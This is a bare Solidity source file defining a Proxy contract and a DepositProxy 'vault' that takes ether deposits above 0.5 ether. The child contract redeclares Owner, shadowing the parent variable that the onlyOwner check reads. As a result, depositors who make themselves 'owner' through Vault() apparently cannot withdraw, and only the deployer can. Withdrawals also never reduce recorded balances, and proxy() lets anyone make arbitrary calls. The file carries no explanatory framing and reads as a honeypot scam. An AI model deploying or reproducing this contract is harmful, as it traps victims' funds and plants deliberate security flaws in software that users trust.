pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
         
        target.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        uint256 msgValue = msg.value;
        if (msgValue > 0.5 ether) {
            uint256 currentDeposit = Deposits[msg.sender];
            currentDeposit += msgValue;
            Deposits[msg.sender] = currentDeposit;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        uint256 senderDeposit = Deposits[msg.sender];
        if (amount > 0 && senderDeposit >= amount) {
            msg.sender.transfer(amount);
        }
    }
}